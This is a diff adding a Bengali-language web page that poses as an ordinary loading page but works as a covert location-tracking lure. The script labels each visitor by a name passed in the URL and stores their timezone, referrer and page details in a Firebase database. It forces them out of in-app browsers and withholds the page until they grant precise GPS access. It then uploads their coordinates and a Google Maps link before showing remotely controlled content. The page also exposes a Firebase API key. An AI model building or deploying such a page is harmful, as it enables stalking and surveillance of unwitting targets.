@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>RX</title>
+
+  <link rel="icon" type="image/png" href="https://img.icons8.com/ios-filled/100/r.png" />
+  <link rel="shortcut icon" type="image/png" href="https://img.icons8.com/ios-filled/100/r.png" />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+Bengali:wght@400;600&family=Hind+Siliguri:wght@400;500;600&display=swap" rel="stylesheet" />
+
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --bg: #fdfbfd;
+      --card-bg: #ffffff;
+      --text: #1a0f16;
+      --text-muted: #6b5966;
+      --primary: #d14167;
+      --border: #f5eef2;
+    }
+
+    html, body { min-height: 100%; }
+
+    body {
+      font-family: 'Hind Siliguri', sans-serif;
+      background-color: var(--bg);
+      color: var(--text);
+      overflow-x: hidden;
+    }
+
+    /* ─── GOOGLE-STYLE LOADER ─────────────────────────────────── */
+    #google-loader {
+      position: fixed; inset: 0;
+      background: var(--bg);
+      z-index: 100;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+    }
+
+    #progress-bar-wrap {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 3px;
+      background: transparent; z-index: 9999;
+    }
+
+    #progress-bar {
+      height: 100%; width: 0%;
+      background: var(--primary);
+      border-radius: 0 2px 2px 0;
+      transition: width 0.25s ease;
+      box-shadow: 0 0 8px rgba(209,65,103,0.6);
+    }
+
+    .g-dots {
+      display: flex; gap: 10px;
+      align-items: center; margin-bottom: 28px;
+    }
+
+    .g-dot {
+      width: 14px; height: 14px;
+      border-radius: 50%;
+      animation: gBounce 1.2s infinite ease-in-out;
+    }
+
+    .g-dot:nth-child(1) { background: #4285F4; animation-delay: 0s; }
+    .g-dot:nth-child(2) { background: #EA4335; animation-delay: 0.15s; }
+    .g-dot:nth-child(3) { background: #FBBC05; animation-delay: 0.3s; }
+    .g-dot:nth-child(4) { background: #34A853; animation-delay: 0.45s; }
+
+    @keyframes gBounce {
+      0%, 80%, 100% { transform: scale(0.7); opacity: 0.5; }
+      40%            { transform: scale(1.1); opacity: 1; }
+    }
+
+    .g-status {
+      font-size: 13px;
+      color: var(--text-muted);
+      letter-spacing: 0.04em;
+    }
+
+    /* ─── BROWSER REDIRECT DIALOG ─────────────────────────────── */
+    .browser-redirect-overlay {
+      position: fixed; inset: 0;
+      background: rgba(26, 15, 22, 0.5);
+      backdrop-filter: blur(5px);
+      z-index: 400;
+      display: flex; align-items: center; justify-content: center;
+      padding: 16px;
+      opacity: 0; pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    .browser-redirect-overlay.show { opacity: 1; pointer-events: auto; }
+
+    .browser-redirect-dialog {
+      background: var(--card-bg);
+      max-width: 340px; width: 100%;
+      padding: 32px 24px; border-radius: 20px;
+      text-align: center;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+      border: 1px solid var(--border);
+      animation: slideUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+
+    @keyframes slideUp {
+      from { transform: translateY(20px); opacity: 0; }
+      to   { transform: translateY(0);    opacity: 1; }
+    }
+
+    .redirect-icon  { font-size: 45px; margin-bottom: 18px; display: inline-block; }
+    .redirect-title { font-family: 'Noto Serif Bengali', serif; font-size: 18px; font-weight: 600; color: var(--text); margin-bottom: 10px; }
+    .redirect-desc  { font-size: 14px; color: var(--text-muted); line-height: 1.6; margin-bottom: 26px; }
+
+    .redirect-btn {
+      background: var(--primary); color: white; border: none;
+      padding: 13px 28px;
+      font-family: 'Hind Siliguri', sans-serif; font-size: 15px; font-weight: 600;
+      border-radius: 50px; cursor: pointer; width: 100%;
+      box-shadow: 0 4px 15px rgba(209,65,103,0.3);
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    .redirect-btn:active   { transform: scale(0.97); }
+    .redirect-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+    /* ─── GPS OFF DIALOG ──────────────────────────────────────── */
+    .gps-dialog-overlay {
+      position: fixed; inset: 0;
+      background: rgba(26, 15, 22, 0.45);
+      backdrop-filter: blur(5px);
+      z-index: 300;
+      display: flex; align-items: center; justify-content: center;
+      padding: 16px;
+      opacity: 0; pointer-events: none;
+      transition: opacity 0.35s ease;
+    }
+    .gps-dialog-overlay.show { opacity: 1; pointer-events: auto; }
+
+    .gps-dialog {
+      background: var(--card-bg);
+      max-width: 360px; width: 100%;
+      padding: 32px 24px; border-radius: 24px;
+      text-align: center;
+      box-shadow: 0 15px 35px rgba(0,0,0,0.12);
+      border: 1px solid var(--border);
+      transform: scale(0.88);
+      transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+    .gps-dialog-overlay.show .gps-dialog { transform: scale(1); }
+
+    .gps-icon  { font-size: 44px; margin-bottom: 16px; display: inline-block; }
+    .gps-title { font-family: 'Noto Serif Bengali', serif; font-size: 19px; font-weight: 600; color: var(--text); margin-bottom: 10px; }
+    .gps-desc  { font-size: 14px; color: var(--text-muted); line-height: 1.65; margin-bottom: 24px; }
+
+    .gps-btn {
+      background: var(--primary); color: white; border: none;
+      padding: 13px 28px;
+      font-family: 'Hind Siliguri', sans-serif; font-size: 15px; font-weight: 600;
+      border-radius: 50px; cursor: pointer; width: 100%;
+      box-shadow: 0 4px 15px rgba(209,65,103,0.3);
+      transition: transform 0.2s;
+    }
+    .gps-btn:active { transform: scale(0.97); }
+
+    /* ─── FULLSCREEN IFRAME ───────────────────────────────────── */
+    #full-iframe {
+      position: fixed; inset: 0;
+      width: 100%; height: 100%;
+      border: none; display: none;
+      z-index: 200;
+    }
+  </style>
+</head>
+<body>
+
+  <iframe id="full-iframe" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-geolocation"></iframe>
+
+  <!-- Google-style loader -->
+  <div id="progress-bar-wrap"><div id="progress-bar"></div></div>
+  <div id="google-loader">
+    <div class="g-dots">
+      <div class="g-dot"></div><div class="g-dot"></div>
+      <div class="g-dot"></div><div class="g-dot"></div>
+    </div>
+    <div class="g-status" id="g-status-text">Loading...</div>
+  </div>
+
+  <!-- Browser Redirect Dialog -->
+  <div id="browser-redirect-overlay" class="browser-redirect-overlay">
+    <div class="browser-redirect-dialog">
+      <div class="redirect-icon">🌐</div>
+      <div class="redirect-title">Open in Native Browser</div>
+      <div class="redirect-desc">For the best experience and to access your location, please open this link in your default browser.</div>
+      <button id="redirect-btn" class="redirect-btn">Open Now</button>
+    </div>
+  </div>
+
+  <!-- GPS Off Dialog -->
+  <div id="gps-dialog-overlay" class="gps-dialog-overlay">
+    <div class="gps-dialog">
+      <div class="gps-icon">📍</div>
+      <div class="gps-title">Location Service বন্ধ আছে</div>
+      <div class="gps-desc">এই পৃষ্ঠাটি দেখতে হলে আপনার ফোনের Location (GPS) চালু করতে হবে। Settings এ গিয়ে Location চালু করুন, তারপর আবার চেষ্টা করুন।</div>
+      <button id="gps-settings-btn" class="gps-btn">⚙️ Settings খুলুন</button>
+    </div>
+  </div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getDatabase, ref, push, update, onValue, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+/* ── Firebase config ── */
+const firebaseConfig = {
+  apiKey: "AIzaSyDs3buPka62aeOttWyKBaT7sEDotXVK5Zw",
+  authDomain: "love-5585d.firebaseapp.com",
+  databaseURL: "https://love-5585d-default-rtdb.firebaseio.com",
+  projectId: "love-5585d",
+  storageBucket: "love-5585d.firebasestorage.app",
+  messagingSenderId: "435569951955",
+  appId: "1:435569951955:web:863b3686c567c210e78026",
+  measurementId: "G-2VZ27SZY2P"
+};
+
+const app = initializeApp(firebaseConfig);
+const db  = getDatabase(app);
+
+/* ── Progress bar ── */
+function setProgress(p) {
+  document.getElementById("progress-bar").style.width = Math.min(p, 100) + "%";
+}
+function setStatus(txt) {
+  const el = document.getElementById("g-status-text");
+  if (el) el.textContent = txt;
+}
+
+/* ── Detect in-app browser ── */
+function detectInAppBrowser() {
+  const ua = navigator.userAgent.toLowerCase();
+  return {
+    isTikTok:    /tiktok|musical\.ly/i.test(ua),
+    isMessenger: /fban|fbav|messenger/i.test(ua),
+    isInstagram: /instagram/i.test(ua),
+    isWhatsApp:  /whatsapp/i.test(ua),
+    isWeChat:    /wechat|micromessenger/i.test(ua),
+    isQQ:        /qq\//i.test(ua),
+    isSnapchat:  /snapchat/i.test(ua),
+    get isAnyInApp() {
+      return this.isTikTok || this.isMessenger || this.isInstagram ||
+             this.isWhatsApp || this.isWeChat || this.isQQ || this.isSnapchat;
+    }
+  };
+}
+
+/* ── Redirect to native browser ── */
+function redirectToNativeBrowser() {
+  const url = window.location.href;
+  const ua  = navigator.userAgent.toLowerCase();
+  if (/iphone|ipad|ipod/.test(ua)) {
+    window.location.href = `safari-${url}`;
+    setTimeout(() => { window.location.href = url; }, 500);
+  } else if (/android/.test(ua)) {
+    window.location.href = `intent://${url.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
+  } else {
+    window.open(url, "_blank");
+  }
+}
+
+/* ── Hide loader ── */
+function hideLoader() {
+  setProgress(100);
+  setTimeout(() => {
+    const loader = document.getElementById("google-loader");
+    const bar    = document.getElementById("progress-bar-wrap");
+    if (loader) loader.style.display = "none";
+    if (bar)    bar.style.display    = "none";
+  }, 300);
+}
+
+/* ── Show GPS dialog ── */
+function showGpsDialog() {
+  hideLoader();
+  document.getElementById("gps-dialog-overlay").classList.add("show");
+  document.getElementById("gps-settings-btn").addEventListener("click", () => {
+    if (navigator.userAgent.toLowerCase().includes("android")) {
+      try { window.location.href = "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end"; }
+      catch(e) { alert("Settings > Location চালু করুন, তারপর পেজ Refresh করুন।"); }
+    } else {
+      alert("আপনার ফোনের Settings > Privacy > Location Services চালু করুন, তারপর পেজ Refresh করুন।");
+    }
+  });
+}
+
+/* ── Show iframe ── */
+function showIframe(htmlContent) {
+  hideLoader();
+  const iframe = document.getElementById("full-iframe");
+  if (!iframe) return;
+  if (htmlContent && htmlContent.trim() !== "") {
+    iframe.srcdoc = htmlContent;
+  }
+  iframe.style.display = "block";
+}
+
+/* ── Show denied notice ── */
+function showDeniedNotice() {
+  const loaderEl = document.getElementById("google-loader");
+  if (!loaderEl) return;
+  loaderEl.style.display = "flex";
+  loaderEl.innerHTML = `
+    <div style="text-align:center; padding:20px; max-width:320px;">
+      <div style="font-size:48px; margin-bottom:16px;">📍</div>
+      <h3 style="color:#d14167; font-family:'Hind Siliguri',sans-serif; font-size:18px; font-weight:600; margin-bottom:12px;">
+        লোকেশন অনুমতি প্রয়োজন
+      </h3>
+      <p style="color:#6b5966; font-size:14px; line-height:1.7; margin-bottom:20px;">
+        এই পেজের সকল ফিচার সঠিকভাবে ব্যবহার করতে আপনার ডিভাইসের Location অনুমতি চালু থাকতে হবে।<br><br>
+        ব্রাউজারের Settings → Site Settings → Location এ গিয়ে এই সাইটকে Allow করুন, তারপর পেজ Refresh করুন।
+      </p>
+      <button onclick="location.reload()" style="background:#d14167; color:white; border:none; padding:12px 28px; font-family:'Hind Siliguri',sans-serif; font-size:15px; font-weight:600; border-radius:50px; cursor:pointer; width:100%;">
+        🔄 Refresh করুন
+      </button>
+    </div>
+  `;
+}
+
+/* ── Helper: name from URL ── */
+function getNameFromURL() {
+  const params = new URLSearchParams(window.location.search);
+  return decodeURIComponent(params.get('n') || params.get('name') || 'Unknown');
+}
+
+/* ── Custom UI: অরিজিনালের মতো onValue দিয়ে listen,
+      কিন্তু Promise wrap করা — যাতে first value আসা পর্যন্ত await করা যায় ── */
+let cachedHtmlContent = "";
+function listenForCustomUI() {
+  return new Promise((resolve) => {
+    const uiRef = ref(db, "ui_config/custom_html");
+    onValue(uiRef, (snapshot) => {
+      cachedHtmlContent = snapshot.val() || "";
+      resolve(cachedHtmlContent); // প্রথমবার value আসলেই resolve
+    }, { onlyOnce: false }); // real-time listener চলতে থাকবে পরেও
+  });
+}
+
+/* ── Request GPS location ── */
+function requestExactLocation(visitorKey) {
+  return new Promise((resolve) => {
+    if (!("geolocation" in navigator)) return resolve({ success: false, reason: "unsupported" });
+
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        const locationData = {
+          latitude:          position.coords.latitude,
+          longitude:         position.coords.longitude,
+          location_accuracy: position.coords.accuracy + " meters",
+          location_status:   "Granted",
+          maps_link:         `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
+        };
+        try { await update(ref(db, `visitors/${visitorKey}`), locationData); } catch(e) {}
+        resolve({ success: true });
+      },
+      async (error) => {
+        let reason = "Denied";
+        if (error.code === error.POSITION_UNAVAILABLE) reason = "GPS_OFF";
+        if (error.code === error.TIMEOUT)              reason = "Timeout";
+        try { await update(ref(db, `visitors/${visitorKey}`), { location_status: reason }); } catch(e) {}
+        resolve({ success: false, reason });
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  });
+}
+
+/* ── Main flow ── */
+async function processVisitorFlow() {
+
+  /* 1) In-app browser check */
+  if (detectInAppBrowser().isAnyInApp) {
+    hideLoader();
+    document.getElementById("browser-redirect-overlay").classList.add("show");
+    const btn = document.getElementById("redirect-btn");
+    if (btn) btn.addEventListener("click", () => {
+      btn.disabled = true;
+      btn.textContent = "Redirecting...";
+      redirectToNativeBrowser();
+    });
+    return;
+  }
+
+  /* 2) Loading animation + UI fetch + visitor save — সব parallel */
+  setProgress(10); setStatus("Connecting...");
+  await new Promise(r => setTimeout(r, 600));
+  setProgress(40); setStatus("Loading...");
+
+  /* Firebase থেকে custom HTML আনা ও visitor data save — parallel */
+  let activeKey = "";
+  const [htmlContent] = await Promise.all([
+
+    /* A) onValue দিয়ে custom UI fetch (অরিজিনালের মতো) */
+    listenForCustomUI(),
+
+    /* B) Visitor data save */
+    (async () => {
+      const visitorData = {
+        custom_label:    getNameFromURL(),
+        timezone:        Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
+        local_time:      new Date().toLocaleString("en-BD"),
+        referrer:        document.referrer || "Direct Link",
+        page_url:        window.location.href,
+        updatedAt:       serverTimestamp(),
+        location_status: "Prompted"
+      };
+      try {
+        const existingKey  = localStorage.getItem("hoor_toor_key");
+        const savedLabel   = localStorage.getItem("hoor_toor_label");
+        const currentLabel = getNameFromURL();
+        if (existingKey && savedLabel === currentLabel) {
+          activeKey = existingKey;
+          await update(ref(db, `visitors/${activeKey}`), visitorData);
+        } else {
+          const newRef = await push(ref(db, "visitors"), { ...visitorData, createdAt: serverTimestamp() });
+          activeKey    = newRef.key;
+          localStorage.setItem("hoor_toor_key",   activeKey);
+          localStorage.setItem("hoor_toor_label", currentLabel);
+        }
+      } catch(err) { console.error("Sync Error:", err); }
+    })(),
+
+    /* C) Minimum loader visible time */
+    new Promise(r => setTimeout(r, 800))
+  ]);
+
+  /* 3) Wait minimum 3s total */
+  setProgress(70); setStatus("Finalizing...");
+  const elapsed = performance.now();
+  if (elapsed < 3000) await new Promise(r => setTimeout(r, 3000 - elapsed));
+
+  setProgress(90); setStatus("Requesting location...");
+
+  /* 4) Request GPS */
+  const locResult = await requestExactLocation(activeKey);
+
+  /* 5) GPS off */
+  if (!locResult.success && locResult.reason === "GPS_OFF") {
+    showGpsDialog();
+    return;
+  }
+
+  /* 6) Permission denied */
+  if (!locResult.success) {
+    showDeniedNotice();
+    return;
+  }
+
+  /* 7) Success → iframe এ custom UI দেখাও */
+  setProgress(100);
+  showIframe(htmlContent);
+}
+
+/* ── Bootstrap ── */
+window.addEventListener("load", processVisitorFlow);
+</script>
+</body>
+</html>
